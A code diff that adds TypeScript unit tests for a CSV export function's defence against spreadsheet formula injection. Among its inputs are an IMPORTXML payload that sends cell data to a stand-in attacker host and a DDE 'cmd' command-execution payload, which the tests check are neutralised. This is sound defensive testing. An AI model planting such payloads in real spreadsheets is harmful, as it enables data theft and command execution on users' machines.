@@ -174,5 +174,64 @@ describe('analytics.util', () => {
       const csv = toCsv([{ note: null }]);
       expect(csv).toBe('note\r\n');
     });
+
+    /**
+     * Spreadsheet formula injection. The export is a file a human opens in
+     * Excel or Sheets, and those evaluate a leading =, +, -, @, tab or CR as a
+     * formula — inside RFC 4180 quotes just the same, so quoting is not the
+     * defence. A staff-export row carries a team member's own display name.
+     */
+    describe('formula injection', () => {
+      const csvBody = (value: string) => toCsv([{ name: value }]).split('\r\n')[1];
+
+      it.each(['=', '+', '-', '@', '\t', '\r'])(
+        'neutralises a cell starting with %j',
+        (trigger) => {
+          expect(csvBody(`${trigger}1+1`)).toContain(`'${trigger}1+1`);
+        },
+      );
+
+      it('defuses a data-exfiltrating IMPORTXML payload', () => {
+        const payload = '=IMPORTXML(CONCAT("https://attacker.example/?d=",A2),"//a")';
+        const body = csvBody(payload);
+
+        // The apostrophe must come before the '=', or the cell still evaluates.
+        expect(body!.startsWith("\"'=IMPORTXML") || body!.startsWith("'=IMPORTXML")).toBe(true);
+        expect(body).not.toMatch(/(^|,)=IMPORTXML/);
+      });
+
+      it('defuses the DDE command-execution form', () => {
+        expect(csvBody('=cmd|\'/c calc\'!A1')).toContain("'=cmd");
+      });
+
+      it('still quotes a neutralised value that also contains a comma', () => {
+        // Both defences have to apply; neither may cancel the other out.
+        expect(csvBody('=A1,B1')).toBe('"\'=A1,B1"');
+      });
+
+      it('neutralises a header key too', () => {
+        // Headers come from row keys, which the staff export builds, but a
+        // formula reaching row 1 would be just as live as one in row 2.
+        expect(toCsv([{ '=evil()': 1 }]).split('\r\n')[0]).toBe("'=evil()");
+      });
+
+      it('leaves ordinary text untouched', () => {
+        expect(csvBody('Priya Sharma')).toBe('Priya Sharma');
+        expect(csvBody('2026-06-01')).toBe('2026-06-01');
+      });
+
+      /**
+       * Numeric cells are built by this codebase, never by a user, so a
+       * negative number must stay a number — prefixing it would turn a revenue
+       * column into text and break every consumer downstream.
+       */
+      it('leaves a negative number as a number', () => {
+        expect(toCsv([{ deltaPaise: -500 }])).toBe('deltaPaise\r\n-500');
+      });
+
+      it('leaves an empty string and a false boolean alone', () => {
+        expect(toCsv([{ a: '', b: false }])).toBe('a,b\r\n,false');
+      });
+    });
   });
 });
